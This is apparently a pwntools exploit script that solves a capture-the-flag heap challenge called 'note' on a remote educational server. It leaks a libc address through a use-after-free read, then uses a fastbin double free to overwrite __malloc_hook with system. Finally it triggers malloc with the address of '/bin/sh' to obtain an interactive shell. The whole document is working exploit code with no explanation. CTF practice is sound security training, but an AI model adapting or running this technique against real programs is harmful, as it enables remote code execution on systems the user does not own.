from pwn import *
context.arch = 'amd64'
#conn = process('./note')
conn = remote('edu-ctf.csie.org', 10178)
l = ELF('./libc-2.23.so')

def add(size, note):
    conn.sendafter('> ', '1')
    conn.sendafter('Size: ', str(size))
    conn.sendafter('Note: ', note)

def show(index):
    conn.sendafter('> ', '2')
    conn.sendafter('Index: ', str(index))

def delete(index):
    conn.sendafter('> ', '3')
    conn.sendafter('Index: ', str(index))


add(0x100, 'leak')
add(0x68, 'a')
add(0x68, 'b')

delete(0)

show(0)

conn.recvline()
l.address = u64(conn.recv(6) + '\0\0') - 0x3c4b78

delete(1)
delete(2)
delete(1)

add(0x68,p64(l.sym.__malloc_hook - 0x10 - 3))
add(0x68, 'a')
add(0x68, 'a')
add(0x68, 'aaa' + p64(l.sym.system))

conn.sendafter('> ', '1')
conn.sendafter('Size: ', str(l.search('/bin/sh').next()))


conn.interactive()
